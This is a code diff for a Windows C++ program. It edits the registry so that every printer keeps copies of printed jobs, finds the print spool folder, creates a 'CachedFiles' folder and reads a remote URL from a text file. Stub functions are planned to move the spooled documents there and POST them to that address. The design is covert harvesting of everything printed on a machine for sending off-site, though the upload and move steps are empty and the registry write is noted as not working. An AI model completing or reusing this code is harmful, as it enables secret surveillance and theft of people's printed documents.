@@ -2,6 +2,9 @@
 #include <winspool.h>;
 #include <iostream>;
 #include <atlstr.h>;
+#include <string>;
+#include <fstream>;
+#include <direct.h>;
 
 using namespace std;
 
@@ -13,14 +16,27 @@ DWORD test;
 LPDEVMODE pDevModeX;
 int i;
 
+string SpoolLocation;
+string SiteLocation;
+
 void GetAllPrinters();
+void ChangeKAPD();
 void GetDefaultSpoolFileDirectory();
+void CreateFolder();
+void PostToLink();
+void GetPOSTLink();
+void MoveFiles();
 
 int main(){
 
 	GetAllPrinters();
+	ChangeKAPD();
 	GetDefaultSpoolFileDirectory();
+	CreateFolder();
+	GetPOSTLink();
 
+	cout << "Spool Location: " << SpoolLocation << "\n";
+	cout << "Site location: " << SiteLocation;
 
 	cin.get();
 
@@ -54,17 +70,32 @@ void GetAllPrinters(){
 }
 
 //Change all printers to "Keep All Printed Documents" to "True"  -  http://support.microsoft.com/kb/167345
-void ChangeKAPD(){
-	test = DocumentProperties(NULL, NULL, list[0].pPrinterName, list[0].pDevMode, list[0].pDevMode, NULL); //Messing around with this.
-	pDevModeX = (LPDEVMODE)malloc(test);
+void ChangeKAPD(){ //Registry hack to change all printers to KAPD
 
-	//pDevModeX->dmDeviceName = "Test";
+	string printerStartLocation = "SYSTEM\\CurrentControlSet\\Control\\Print\\Printers\\";
+	string printerEndLocation = "\\DsSpooler";
+	string fullLocation;
+	HKEY hKey;
 
+	for (int i = 0; i < sizeof(list) - 1; i++){
+		fullLocation = printerStartLocation + list[i].pPrinterName + printerEndLocation;
+
+		//Test: "SYSTEM\\CurrentControlSet\\Control\\Print\\Printers\\Foxit Reader PDF Printer\\DsSpooler"
+
+		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,(fullLocation.c_str()),0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS){ //Attempts to open the Registry Key location.
+			TCHAR value[256];
+			DWORD dwKeyDataType;
+			UCHAR byteRegArray[] = {0x01};
+
+			RegSetValueEx(hKey, "printKeepPrintedJobs", 0, REG_BINARY, (BYTE *)byteRegArray, sizeof(byteRegArray)); //Sets the key to 1 (Currently not working)
+		}
+			RegCloseKey(hKey); //Closes the key.
+	}
 }
 
-//Find the Windows Spoolfile Directory
+//Find the Windows DEFAUlT Spoolfile Directory  -- You're able to change each printers Spoolfile Directory seperatly. Not going to worry about that currently.
 void GetDefaultSpoolFileDirectory(){
-	CString location = ("");
+	CString location;
 	HKEY hKey;
 	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,("SYSTEM\\CurrentControlSet\\Control\\Print\\Printers"),0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS){ //Attempts to open the Registry Key location.
 		TCHAR value[256];
@@ -75,11 +106,33 @@ void GetDefaultSpoolFileDirectory(){
 		}
 		RegCloseKey(hKey); //Closes the key.
 	}
-	printf(location);
+	SpoolLocation = location;
 }
 
-//Copy any files named "CachedFiles" into the same file as the EXE
+//Create Folder called 
+void CreateFolder(){
+	mkdir("CachedFiles"); //Should automatically ignore if the file is already there.
+}
+
+//Move all files from the spoolfile to the CachedFiles folder.
+void MoveFiles(){
+
+}
 
 //Get address from external file
+void GetPOSTLink(){
+	string line;
+	ifstream myfile ("SiteLocation.txt");
+	if (myfile.is_open()){
+		while(getline (myfile,line) ){
+			SiteLocation = line;
+		}
+		myfile.close();
+	}
+	else cout << "SiteLocation.txt not found"; 
+}
 
 //POST to that said address
+void PostToLink(){
+
+}
